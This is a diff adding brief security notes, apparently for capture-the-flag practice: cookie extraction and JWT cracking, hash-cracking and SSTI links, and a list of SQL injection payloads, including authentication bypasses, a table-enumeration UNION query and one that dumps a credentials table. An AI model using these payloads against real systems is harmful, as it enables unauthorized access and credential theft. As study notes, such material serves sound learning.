@@ -1,0 +1,22 @@
+extract cookies gotten from inspect -> application -> cookies
+jwt-cracker -t <cookies extracted>
+
+https://cyberchef.org/#recipe=JWT_Decode()&input=ZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKSVV6STFOaUo5LmV5SnliMnhsSWpvaWRYTmxjaUlzSW5ScGJXVWlPakUzTkRJMU56QXhNVEV1TWpFeU5UZzBOWDAua3N4dC1iR3BCeWh6RmtsaE0xYW1wbW44S2ZackNOMlFsaGRlNktPdGtsUQ
+https://jwt.io/
+
+https://www.cachesleuth.com/multidecoder/
+
+SSTI
+https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+
+Crack hash
+https://crackstation.net/
+https://www.tunnelsup.com/hash-analyzer/
+
+SQL injection https://github.com/payloadbox/sql-injection-payload-list
+ ' OR 1=1--
+ ' OORR 1=1;--
+ ' OR 1=1;--
+ '=0--+
+  1' UNION SELECT 1,group_concat(tbl_name),3,4  FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'; --
+  ' UNION SELECT * FROM credentials;--
